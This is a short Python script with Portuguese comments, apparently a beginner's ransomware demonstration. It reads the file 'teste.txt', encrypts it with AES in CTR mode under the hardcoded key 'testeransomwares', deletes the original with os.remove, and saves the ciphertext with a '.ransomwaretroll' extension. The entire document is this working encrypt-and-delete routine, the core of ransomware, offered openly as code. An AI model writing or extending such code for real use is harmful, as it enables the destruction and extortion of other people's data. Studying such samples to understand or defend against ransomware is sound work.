import os
import pyaes

# Abrir o arquivo e ser criptografado
file_name = 'teste.txt'
file = open(file_name, 'rb')
file_data = file.read()
file.close()

# Definir chave encriptação
key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)

# Criptografar arquivo
crypto_data = aes.encrypt(file_data)

# Removendo arquivo original
os.remove(file_name)

# Salvar o arquivo criptografado
new_file = file_name + '.ransomwaretroll'
new_file = open(f'{new_file}', 'wb')
new_file.write(crypto_data)
new_file.close()